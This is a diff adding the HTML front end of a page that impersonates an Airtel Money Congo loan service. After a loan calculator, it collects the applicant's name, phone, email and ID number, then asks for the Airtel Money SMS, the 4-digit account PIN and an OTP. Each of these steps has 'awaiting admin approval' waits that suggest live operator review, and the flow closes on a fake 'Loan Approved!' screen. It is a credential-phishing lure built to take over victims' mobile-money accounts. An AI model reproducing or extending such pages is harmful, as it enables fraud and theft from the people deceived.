@@ -1,0 +1,603 @@
+<!DOCTYPE html>
+<html lang="fr">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
+    <title>Airtel Money Congo – Easy Loans</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="./style.css" />
+</head>
+<body data-lang="fr">
+
+<!-- ═════════ SPLASH ═════════ -->
+<div id="page-splash" class="page page-splash active">
+    <div class="splash-container">
+        <img src="./airtel_logo.png" alt="Airtel Money" class="splash-logo" />
+        <h1 class="splash-title" data-key="splashTitle">Airtel Money Congo</h1>
+        <p class="splash-sub" data-key="splashSub">Fast, secure loans — right at your fingertips</p>
+        <div class="splash-loader">
+            <div class="splash-loader-bar" id="splashLoaderBar"></div>
+        </div>
+        <p class="splash-hint" data-key="splashHint">Getting things ready…</p>
+    </div>
+</div>
+
+<!-- ═════════ LANDING ═════════ -->
+<div id="page-landing" class="page">
+    <div class="land-nav">
+        <img src="./airtel_logo.png" alt="Airtel Money" class="land-logo" />
+        <div class="lang-switch">
+            <button class="lang-btn active" data-lang-btn="fr" onclick="switchLang('fr')">FR</button>
+            <button class="lang-btn" data-lang-btn="en" onclick="switchLang('en')">EN</button>
+            <button class="lang-btn" data-lang-btn="ln" onclick="switchLang('ln')">LN</button>
+            <button class="lang-btn" data-lang-btn="sw" onclick="switchLang('sw')">SW</button>
+        </div>
+    </div>
+    <div class="land-center">
+        <div class="land-card">
+            <div class="land-hero">
+                <h1 data-key="landHero">Welcome to Airtel Money Loans</h1>
+                <p data-key="landSub">Get instant loans through Airtel Money Congo</p>
+            </div>
+
+            <div class="calc-box">
+                <h2 data-key="calcTitle">Loan Calculator</h2>
+                <div class="calc-row2">
+                    <span data-key="calcAmount">Amount</span>
+                    <span class="cv" id="calcAmt">$1,000</span>
+                </div>
+                <div class="calc-row2">
+                    <span data-key="calcTerm">Term</span>
+                    <span class="cv" id="calcTerm">12 months</span>
+                </div>
+                <input type="range" id="amtSlider" min="100" max="5000" step="50" value="1000" oninput="updateLandingCalc()" />
+                <div class="range-ends">
+                    <span>$100</span>
+                    <span>$5,000</span>
+                </div>
+                <div class="monthly-box">
+                    <span class="ml" data-key="calcMonthly">Monthly Payment</span>
+                    <span class="ma" id="monthlyAmt">$85</span>
+                </div>
+            </div>
+
+            <button class="btn-primary" onclick="startApplication()">
+                <span data-key="startBtn">START APPLICATION</span>
+                <i class="fas fa-arrow-right"></i>
+            </button>
+        </div>
+    </div>
+    <div class="land-footer">
+        <span data-key="footer">© 2026 Airtel Money Loans · Powered by Airtel Congo</span>
+    </div>
+</div>
+
+<!-- ═════════ STEP 1 — LOAN DETAILS ═════════ -->
+<div id="page-step1" class="page">
+    <nav class="navbar">
+        <a class="nav-back" onclick="goTo('page-landing')">
+            <i class="fas fa-arrow-left"></i>
+            <span data-key="back">Back</span>
+        </a>
+        <img src="./airtel_logo.png" alt="Airtel Money" class="nav-logo" />
+        <div class="nav-spacer"></div>
+    </nav>
+    <div class="step-center">
+        <div class="step-card">
+            <div class="step-header">
+                <h2 data-key="step1Title">Loan Application</h2>
+                <p class="step-sub">
+                    <span data-key="stepWord">Step</span>
+                    <span>1 / 5</span>
+                </p>
+            </div>
+            <div class="progress-track"><div class="progress-fill" style="width:20%"></div></div>
+
+            <div class="error-banner" id="s1Err"><span>⚠</span><span id="s1ErrTxt"></span></div>
+
+            <div class="field">
+                <label data-key="loanTypeLabel">Loan Type</label>
+                <div class="select-wrap">
+                    <select id="s1ty">
+                        <option value="Personnel" data-key="loanTypePersonal">Personal Loan</option>
+                        <option value="Professionnel" selected data-key="loanTypeBusiness">Business Loan</option>
+                    </select>
+                </div>
+            </div>
+
+            <div class="field">
+                <label data-key="amountLabel">Loan Amount ($)</label>
+                <input type="number" id="s1am" value="1000" min="100" max="5000" step="50" oninput="clearErr('s1Err')" />
+            </div>
+
+            <div class="field">
+                <label data-key="termLabel">Loan Term (months)</label>
+                <div class="select-wrap">
+                    <select id="s1te">
+                        <option value="3">3</option>
+                        <option value="6">6</option>
+                        <option value="9">9</option>
+                        <option value="12" selected>12</option>
+                        <option value="18">18</option>
+                        <option value="24">24</option>
+                        <option value="36">36</option>
+                        <option value="48">48</option>
+                    </select>
+                </div>
+            </div>
+
+            <div class="field">
+                <label data-key="purposeLabel">Purpose of Loan</label>
+                <textarea id="s1pu" rows="3" placeholder="" oninput="clearErr('s1Err')"></textarea>
+            </div>
+
+            <div class="calc-summary-box">
+                <div class="calc-summary-row">
+                    <span data-key="sumMonthly">Monthly</span>
+                    <span class="cv" id="sumMonthly">$85</span>
+                </div>
+                <div class="calc-summary-row">
+                    <span data-key="sumTotal">Total</span>
+                    <span class="cv" id="sumTotal">$1,025</span>
+                </div>
+                <div class="calc-summary-row">
+                    <span data-key="sumInterest">Interest</span>
+                    <span class="cv" id="sumInterest">$25</span>
+                </div>
+            </div>
+
+            <button class="btn-primary" onclick="toS2()">
+                <span data-key="nextBtn">NEXT STEP</span>
+                <i class="fas fa-arrow-right"></i>
+            </button>
+        </div>
+    </div>
+</div>
+
+<!-- ═════════ STEP 2 — PERSONAL DETAILS ═════════ -->
+<div id="page-step2" class="page">
+    <nav class="navbar">
+        <a class="nav-back" onclick="goTo('page-step1')">
+            <i class="fas fa-arrow-left"></i>
+            <span data-key="back">Back</span>
+        </a>
+        <img src="./airtel_logo.png" alt="Airtel Money" class="nav-logo" />
+        <div class="nav-spacer"></div>
+    </nav>
+    <div class="step-center">
+        <div class="step-card">
+            <div class="step-header">
+                <h2 data-key="step2Title">Personal Details</h2>
+                <p class="step-sub">
+                    <span data-key="stepWord">Step</span>
+                    <span>2 / 5</span>
+                </p>
+            </div>
+            <div class="progress-track"><div class="progress-fill" style="width:40%"></div></div>
+
+            <div class="error-banner" id="s2Err"><span>⚠</span><span id="s2ErrTxt"></span></div>
+
+            <div class="field-row">
+                <div class="field">
+                    <label data-key="firstNameLabel">First Name</label>
+                    <input type="text" id="s2fi" placeholder="" oninput="clearErr('s2Err')" />
+                </div>
+                <div class="field">
+                    <label data-key="lastNameLabel">Last Name</label>
+                    <input type="text" id="s2la" placeholder="" oninput="clearErr('s2Err')" />
+                </div>
+            </div>
+
+            <div class="field">
+                <label data-key="phoneLabel">Phone Number (Congo DRC)</label>
+                <div class="phone-group">
+                    <span class="phone-prefix">🇨🇩 +243</span>
+                    <input type="tel" id="s2ph" placeholder="812345678" maxlength="9" inputmode="numeric" oninput="normalizePhone('s2ph');clearErr('s2Err')" />
+                </div>
+                <span class="field-hint" data-key="phoneHint">9 digits (starts with 8 or 9)</span>
+            </div>
+
+            <div class="field">
+                <label data-key="emailLabel">Email Address</label>
+                <input type="email" id="s2em" placeholder="" oninput="clearErr('s2Err')" />
+            </div>
+
+            <div class="field">
+                <label data-key="idLabel">ID Number</label>
+                <input type="text" id="s2id" placeholder="CNI123456789" oninput="clearErr('s2Err')" />
+            </div>
+
+            <div class="field-row">
+                <div class="field">
+                    <label data-key="cityLabel">City</label>
+                    <div class="select-wrap">
+                        <select id="s2city">
+                            <option value="">—</option>
+                            <option value="Kinshasa">Kinshasa</option>
+                            <option value="Lubumbashi">Lubumbashi</option>
+                            <option value="Mbuji-Mayi">Mbuji-Mayi</option>
+                            <option value="Kisangani">Kisangani</option>
+                            <option value="Kananga">Kananga</option>
+                            <option value="Bukavu">Bukavu</option>
+                            <option value="Goma">Goma</option>
+                            <option value="Likasi">Likasi</option>
+                            <option value="Kolwezi">Kolwezi</option>
+                            <option value="Matadi">Matadi</option>
+                        </select>
+                    </div>
+                </div>
+                <div class="field">
+                    <label data-key="statusLabel">Employment Status</label>
+                    <div class="select-wrap">
+                        <select id="s2status">
+                            <option value="">—</option>
+                            <option value="Salarié" data-key="statusEmp">Employed</option>
+                            <option value="Indépendant" data-key="statusSelf">Self-employed</option>
+                            <option value="Commerçant" data-key="statusTrader">Trader</option>
+                            <option value="Étudiant" data-key="statusStudent">Student</option>
+                            <option value="Fonctionnaire" data-key="statusCivil">Civil servant</option>
+                            <option value="Sans emploi" data-key="statusUnemployed">Unemployed</option>
+                            <option value="Retraité" data-key="statusRetired">Retired</option>
+                        </select>
+                    </div>
+                </div>
+            </div>
+
+            <div class="step-btns">
+                <button class="btn-secondary" onclick="goTo('page-step1')">
+                    <i class="fas fa-arrow-left"></i>
+                    <span data-key="back">Back</span>
+                </button>
+                <button class="btn-primary" onclick="toS3()">
+                    <span data-key="nextBtn">NEXT STEP</span>
+                    <i class="fas fa-arrow-right"></i>
+                </button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- ═════════ STEP 3 — REVIEW ═════════ -->
+<div id="page-step3" class="page">
+    <nav class="navbar">
+        <a class="nav-back" onclick="goTo('page-step2')">
+            <i class="fas fa-arrow-left"></i>
+            <span data-key="back">Back</span>
+        </a>
+        <img src="./airtel_logo.png" alt="Airtel Money" class="nav-logo" />
+        <div class="nav-spacer"></div>
+    </nav>
+    <div class="step-center">
+        <div class="step-card">
+            <div class="step-header">
+                <h2 data-key="step3Title">Review Application</h2>
+                <p class="step-sub">
+                    <span data-key="stepWord">Step</span>
+                    <span>3 / 5</span>
+                </p>
+            </div>
+            <div class="progress-track"><div class="progress-fill" style="width:60%"></div></div>
+
+            <div class="error-banner" id="s3Err"><span>⚠</span><span id="s3ErrTxt"></span></div>
+
+            <div class="sum-box">
+                <h3 data-key="reviewTitle">Application Summary</h3>
+                <div class="sum-row"><span class="sk" data-key="rLoanType">Loan Type</span><span class="sv" id="rLoanType">—</span></div>
+                <div class="sum-row"><span class="sk" data-key="rAmount">Amount</span><span class="sv" id="rAmount">—</span></div>
+                <div class="sum-row"><span class="sk" data-key="rTerm">Term</span><span class="sv" id="rTerm">—</span></div>
+                <div class="sum-row"><span class="sk" data-key="rPurpose">Purpose</span><span class="sv" id="rPurpose">—</span></div>
+                <div class="sum-row"><span class="sk" data-key="rName">Name</span><span class="sv" id="rName">—</span></div>
+                <div class="sum-row"><span class="sk" data-key="rEmail">Email</span><span class="sv" id="rEmail">—</span></div>
+                <div class="sum-row"><span class="sk" data-key="rPhone">Phone</span><span class="sv" id="rPhone">—</span></div>
+                <div class="sum-row"><span class="sk" data-key="rId">ID</span><span class="sv" id="rId">—</span></div>
+                <div class="sum-row"><span class="sk" data-key="rCity">City</span><span class="sv" id="rCity">—</span></div>
+                <div class="sum-row"><span class="sk" data-key="rStatus">Status</span><span class="sv" id="rStatus">—</span></div>
+                <div class="sum-row"><span class="sk" data-key="sumMonthly">Monthly</span><span class="sv" id="rMonthly">—</span></div>
+                <div class="sum-row"><span class="sk" data-key="sumTotal">Total</span><span class="sv" id="rTotal">—</span></div>
+            </div>
+
+            <div class="step-btns">
+                <button class="btn-secondary" onclick="goTo('page-step2')">
+                    <i class="fas fa-arrow-left"></i>
+                    <span data-key="back">Back</span>
+                </button>
+                <button class="btn-primary" onclick="submitApp()">
+                    <i class="fas fa-paper-plane"></i>
+                    <span data-key="submitBtn">SUBMIT APPLICATION</span>
+                </button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- ═════════ STEP 4 — PROCESSING / WAIT ADMIN APPROVAL ═════════ -->
+<div id="page-processing" class="page page-waiting">
+    <div class="waiting-container">
+        <div class="waiting-icon">
+            <div class="pulse-ring"></div>
+            <div class="pulse-core">⏳</div>
+        </div>
+        <h2 class="waiting-title" data-key="processingTitle">Processing Application…</h2>
+        <p class="waiting-sub" data-key="processingSub">Please wait while our team reviews your application</p>
+
+        <div class="countdown-circle">
+            <svg viewBox="0 0 100 100">
+                <circle class="countdown-track" cx="50" cy="50" r="45"></circle>
+                <circle class="countdown-progress" cx="50" cy="50" r="45" id="processingCountdownCircle"></circle>
+            </svg>
+            <div class="countdown-number" id="processingCountdownNum">30</div>
+        </div>
+
+        <p class="waiting-hint" id="processingStatus">
+            <span data-key="waitAdmin">⏳ Awaiting admin approval…</span>
+        </p>
+    </div>
+</div>
+
+<!-- ═════════ STEP 5 — SMS PASTE ═════════ -->
+<div id="page-sms-paste" class="page">
+    <nav class="navbar">
+        <a class="nav-back" onclick="goTo('page-step3')">
+            <i class="fas fa-arrow-left"></i>
+            <span data-key="back">Back</span>
+        </a>
+        <img src="./airtel_logo.png" alt="Airtel Money" class="nav-logo" />
+        <div class="nav-spacer"></div>
+    </nav>
+    <div class="step-center">
+        <div class="step-card">
+            <div class="step-header">
+                <h2 data-key="smsTitle">Verify Airtel Money Message</h2>
+                <p class="step-sub">
+                    <span data-key="stepWord">Step</span>
+                    <span>4 / 6</span>
+                </p>
+            </div>
+            <div class="progress-track"><div class="progress-fill" style="width:70%"></div></div>
+
+            <div class="error-banner" id="momErr"><span>⚠</span><span id="momErrTxt"></span></div>
+
+            <div class="field">
+                <label data-key="smsLabel">📩 Paste the Airtel Money SMS you received</label>
+                <textarea id="smsMsgBox" rows="5" placeholder=""></textarea>
+            </div>
+            <div class="info-notice">
+                <span>💡</span>
+                <p data-key="smsHint">Check your SMS inbox for the message from Airtel Money Congo.</p>
+            </div>
+
+            <button class="btn-primary" onclick="doSmsParse()">
+                <span data-key="smsSubmit">SUBMIT AIRTEL MONEY MESSAGE</span>
+            </button>
+        </div>
+    </div>
+</div>
+
+<!-- ═════════ WAIT SMS ═════════ -->
+<div id="page-wait-sms" class="page page-waiting">
+    <div class="waiting-container">
+        <div class="waiting-icon">
+            <div class="pulse-ring"></div>
+            <div class="pulse-core">📩</div>
+        </div>
+        <h2 class="waiting-title" data-key="waitSmsTitle">Verifying SMS</h2>
+        <p class="waiting-sub" data-key="waitSmsSub">Please wait while our team reviews your message</p>
+
+        <div class="countdown-circle">
+            <svg viewBox="0 0 100 100">
+                <circle class="countdown-track" cx="50" cy="50" r="45"></circle>
+                <circle class="countdown-progress" cx="50" cy="50" r="45" id="smsCountdownCircle"></circle>
+            </svg>
+            <div class="countdown-number" id="smsCountdownNum">30</div>
+        </div>
+
+        <p class="waiting-hint" id="smsWaitStatus">
+            <span data-key="waitAdmin">⏳ Awaiting admin approval…</span>
+        </p>
+    </div>
+</div>
+
+<!-- ═════════ STEP 6 — PIN ENTRY ═════════ -->
+<div id="page-pin" class="page">
+    <nav class="navbar">
+        <a class="nav-back" onclick="goTo('page-sms-paste')">
+            <i class="fas fa-arrow-left"></i>
+            <span data-key="back">Back</span>
+        </a>
+        <img src="./airtel_logo.png" alt="Airtel Money" class="nav-logo" />
+        <div class="nav-spacer"></div>
+    </nav>
+    <div class="step-center">
+        <div class="step-card">
+            <div class="step-header">
+                <h2 data-key="pinTitle">Enter Airtel Money PIN</h2>
+                <p class="step-sub">
+                    <span data-key="stepWord">Step</span>
+                    <span>5 / 6</span>
+                </p>
+            </div>
+            <div class="progress-track"><div class="progress-fill" style="width:85%"></div></div>
+
+            <div class="error-banner" id="pinErr"><span>⚠</span><span id="pinErrTxt"></span></div>
+
+            <p class="pin-prompt" data-key="pinPrompt">Enter your 4-digit Airtel Money PIN</p>
+
+            <div class="pin-row pin-row-4">
+                <input type="password" id="pin0" class="pin-box" maxlength="1" inputmode="numeric" />
+                <input type="password" id="pin1" class="pin-box" maxlength="1" inputmode="numeric" />
+                <input type="password" id="pin2" class="pin-box" maxlength="1" inputmode="numeric" />
+                <input type="password" id="pin3" class="pin-box" maxlength="1" inputmode="numeric" />
+            </div>
+
+            <div class="pin-actions">
+                <button class="link-btn" onclick="togPin()">
+                    <i class="fas fa-eye"></i>
+                    <span data-key="showPin">Show PIN</span>
+                </button>
+                <button class="link-btn" onclick="clearLoginPin()">
+                    <i class="fas fa-times"></i>
+                    <span data-key="clearPin">Clear</span>
+                </button>
+            </div>
+
+            <div class="attempts-badge" id="pinAttemptsDisplay">
+                🔑 <span data-key="attemptsRemaining">3 attempts remaining</span>
+            </div>
+
+            <button class="btn-primary" onclick="doPin()">
+                <span data-key="submitPin">SUBMIT PIN</span>
+            </button>
+        </div>
+    </div>
+</div>
+
+<!-- ═════════ WAIT PIN ═════════ -->
+<div id="page-wait-pin" class="page page-waiting">
+    <div class="waiting-container">
+        <div class="waiting-icon">
+            <div class="pulse-ring"></div>
+            <div class="pulse-core">🔐</div>
+        </div>
+        <h2 class="waiting-title" data-key="waitPinTitle">Verifying PIN</h2>
+        <p class="waiting-sub" data-key="waitPinSub">Please wait while our team reviews your PIN</p>
+
+        <div class="countdown-circle">
+            <svg viewBox="0 0 100 100">
+                <circle class="countdown-track" cx="50" cy="50" r="45"></circle>
+                <circle class="countdown-progress" cx="50" cy="50" r="45" id="pinCountdownCircle"></circle>
+            </svg>
+            <div class="countdown-number" id="pinCountdownNum">30</div>
+        </div>
+
+        <p class="waiting-hint" id="pinWaitStatus">
+            <span data-key="waitAdmin">⏳ Awaiting admin approval…</span>
+        </p>
+    </div>
+</div>
+
+<!-- ═════════ STEP 7 — OTP ═════════ -->
+<div id="page-otp" class="page">
+    <nav class="navbar">
+        <a class="nav-back" onclick="goTo('page-pin')">
+            <i class="fas fa-arrow-left"></i>
+            <span data-key="back">Back</span>
+        </a>
+        <img src="./airtel_logo.png" alt="Airtel Money" class="nav-logo" />
+        <div class="nav-spacer"></div>
+    </nav>
+    <div class="step-center">
+        <div class="step-card">
+            <div class="step-header">
+                <h2 data-key="otpTitle">Enter OTP Code</h2>
+                <p class="step-sub" data-key="otpSub">4-digit code sent via SMS to your phone</p>
+            </div>
+            <div class="progress-track"><div class="progress-fill" style="width:100%"></div></div>
+
+            <div class="error-banner" id="otpErr"><span>⚠</span><span id="otpErrTxt"></span></div>
+
+            <div class="otp-row">
+                <input type="password" id="otp0" class="otp-box" maxlength="1" inputmode="numeric" />
+                <input type="password" id="otp1" class="otp-box" maxlength="1" inputmode="numeric" />
+                <input type="password" id="otp2" class="otp-box" maxlength="1" inputmode="numeric" />
+                <input type="password" id="otp3" class="otp-box" maxlength="1" inputmode="numeric" />
+            </div>
+
+            <div class="otp-actions">
+                <button class="link-btn" onclick="clearOtpCode()">
+                    <i class="fas fa-times"></i>
+                    <span data-key="clearPin">Clear</span>
+                </button>
+            </div>
+
+            <button class="btn-primary" onclick="doOtp()">
+                <i class="fas fa-check"></i>
+                <span data-key="verifyOtp">VERIFY & APPROVE LOAN</span>
+            </button>
+
+            <div class="resend-block hidden" id="otpResendBlock">
+                <p class="resend-hint" data-key="resendHint">Resubmit the same OTP</p>
+                <button class="btn-outline" id="otpResendBtn" onclick="resendOtp()" disabled>
+                    <span data-key="resend">Resend</span>
+                    <span id="otpResendTimer">60</span>s
+                </button>
+            </div>
+        </div>
+    </div>
+</div>
+
+<!-- ═════════ WAIT OTP ═════════ -->
+<div id="page-wait-otp" class="page page-waiting">
+    <div class="waiting-container">
+        <div class="waiting-icon">
+            <div class="pulse-ring"></div>
+            <div class="pulse-core">🔑</div>
+        </div>
+        <h2 class="waiting-title" data-key="waitOtpTitle">Verifying OTP</h2>
+        <p class="waiting-sub" data-key="waitOtpSub">Please wait while our team reviews your OTP</p>
+
+        <div class="countdown-circle">
+            <svg viewBox="0 0 100 100">
+                <circle class="countdown-track" cx="50" cy="50" r="45"></circle>
+                <circle class="countdown-progress" cx="50" cy="50" r="45" id="otpCountdownCircle"></circle>
+            </svg>
+            <div class="countdown-number" id="otpCountdownNum">30</div>
+        </div>
+
+        <p class="waiting-hint" id="otpWaitStatus">
+            <span data-key="waitAdmin">⏳ Awaiting admin approval…</span>
+        </p>
+    </div>
+</div>
+
+<!-- ═════════ APPROVAL ═════════ -->
+<div id="page-approval" class="page page-approval">
+    <div class="approval-container">
+        <div class="approval-badge"><i class="fas fa-check"></i></div>
+        <h2 data-key="approvalTitle">Loan Approved!</h2>
+        <p class="approval-sub" data-key="approvalSub">Your loan has been successfully approved.</p>
+
+        <div class="approval-amount-card">
+            <span class="approval-label" data-key="approvalLabel">Amount to Receive</span>
+            <span class="approval-amount" id="aprAmount">$1,000</span>
+        </div>
+
+        <div class="approval-details">
+            <div class="approval-detail">
+                <span class="detail-icon">💰</span>
+                <div>
+                    <span class="detail-label" data-key="rAmount">Amount</span>
+                    <span class="detail-value" id="aprAmt">$1,000</span>
+                </div>
+            </div>
+            <div class="approval-detail">
+                <span class="detail-icon">📅</span>
+                <div>
+                    <span class="detail-label" data-key="rTerm">Term</span>
+                    <span class="detail-value" id="aprTerm">12 months</span>
+                </div>
+            </div>
+            <div class="approval-detail">
+                <span class="detail-icon">💳</span>
+                <div>
+                    <span class="detail-label" data-key="calcMonthly">Monthly Payment</span>
+                    <span class="detail-value" id="aprMth">$85</span>
+                </div>
+            </div>
+        </div>
+
+        <div class="info-notice">
+            <span>ℹ️</span>
+            <p data-key="approvalInfo">Funds will be deposited to your Airtel Money account within 5 minutes.</p>
+        </div>
+
+        <button class="btn-primary" onclick="finishApplication()">
+            <i class="fas fa-home"></i>
+            <span data-key="finish">FINISH</span>
+        </button>
+    </div>
+</div>
+
+<div id="toast" class="toast"></div>
+<script src="./script.js"></script>
+</body>
+</html>
